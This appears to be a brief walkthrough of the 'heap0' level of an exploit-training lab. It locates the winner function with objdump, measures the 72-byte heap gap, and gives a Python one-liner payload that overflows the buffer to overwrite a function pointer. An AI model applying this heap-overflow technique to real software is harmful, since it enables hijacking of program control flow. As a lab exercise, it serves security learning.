- find address of winner function
$ objdump --syms ./heap0 | grep winner
08048464 g     F .text	00000014              winner

- data and f are adjacent in the heap
$ ./heap0 aaa
data is at 0x804a008, fp is at 0x804a050

The difference is 72 bytes (0x50 - 0x08). We fill this, and after we modify the fp member
to point to the winner function:

$ ./heap0 `python -c 'print "A"*72 + "\x64\x84\x04\x08"'`
data is at 0x804a008, fp is at 0x804a050
level passed
